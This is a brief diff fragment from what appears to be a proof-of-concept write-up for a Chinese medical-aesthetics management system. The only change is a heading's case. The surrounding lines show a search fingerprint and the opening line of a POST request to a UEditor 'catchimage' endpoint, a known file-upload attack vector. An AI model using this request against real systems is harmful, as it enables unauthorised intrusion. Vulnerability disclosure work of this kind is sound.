@@ -8,7 +8,7 @@
 title="宏脉医美行业管理系统"
 ```
 
-## poc
+## POC
 
 ```
 POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
